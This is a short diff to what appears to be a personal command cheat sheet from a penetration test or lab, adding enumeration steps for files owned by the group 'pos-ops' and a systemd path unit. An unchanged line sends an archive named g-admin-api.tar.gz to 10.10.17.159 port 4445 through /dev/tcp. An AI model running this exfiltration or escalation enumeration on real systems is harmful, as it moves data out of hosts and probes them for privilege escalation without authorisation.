@@ -37,3 +37,9 @@ cups-config --version for sniffer
 
 12. send file via dev tcp
 cat < ./g-admin-api.tar.gz  > /dev/tcp/10.10.17.159/4445
+
+13. find owner by group
+find /etc /opt /usr/local /var -group pos-ops -ls 2>/dev/null
+
+14. path watch systemd
+/etc/systemd/system/vrs-duty-apply.path
